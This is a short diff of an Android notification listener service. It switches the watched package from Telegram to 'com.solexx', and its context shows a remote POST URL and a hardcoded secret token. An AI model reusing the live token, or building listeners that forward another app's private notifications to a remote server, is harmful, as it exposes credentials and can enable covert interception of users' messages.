@@ -13,8 +13,8 @@ import java.nio.charset.StandardCharsets;
 
 public class CustomNotificationListenerService extends NotificationListenerService {
     private static String TAG = "NotificationListener";
-    private static String PACKAGE_NAME = "org.telegram.messenger";
-    //private static String PACKAGE_NAME = "com.example.solexx";
+    //private static String PACKAGE_NAME = "org.telegram.messenger";
+    private static String PACKAGE_NAME = "com.solexx";
 
     private static String POST_URL = "https://capybara.s1.zetohosting.pl/add.php";
     private static String TOKEN = "KtE35AKrlEoUlo5xjWFPzWs0CYvWdhATqrakqlxj2Mbg9ZxRTFWlIHh1xTL5wBqf";
